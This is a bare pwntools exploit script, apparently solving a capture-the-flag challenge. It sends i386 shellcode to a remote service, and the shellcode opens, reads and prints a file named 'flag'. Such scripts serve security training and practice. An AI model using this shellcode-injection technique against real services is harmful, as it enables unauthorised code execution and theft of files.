from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10119)
bss_addr = 0x804A060
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('eax', 'esp', 0x100)
shellcode += shellcraft.write(1, 'esp', 0x100)
shellcode += shellcraft.exit(0)
io.sendline(asm(shellcode))
io.interactive()